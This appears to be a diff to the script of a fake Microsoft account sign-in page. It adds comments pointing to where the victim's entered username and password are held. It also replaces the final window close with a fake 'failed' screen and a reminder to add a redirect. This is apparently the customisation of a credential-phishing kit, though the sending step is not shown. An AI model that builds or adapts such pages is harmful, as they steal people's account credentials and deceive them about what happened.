@@ -1,3 +1,6 @@
+/// NOTE unameInp.value is the username value
+/// The password value is pwdInp.value
+
 document.addEventListener('DOMContentLoaded', () => {
     const unReq = "Enter a valid email address, phone number, or Skype name."
     const pwdReq = "Please enter the password for your Microsoft account."
@@ -102,7 +105,11 @@ document.addEventListener('DOMContentLoaded', () => {
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', () => {
             //close the window
-            window.open(location, '_self').close();
+///// CHANGE THIS TO REDIRECT 
+            // window.open(location, '_self').close();
+			
+			document.getElementById('section_final').classList.toggle('d-none');
+            document.getElementById('section_failed').classList.remove('d-none');
         })
     })
 })
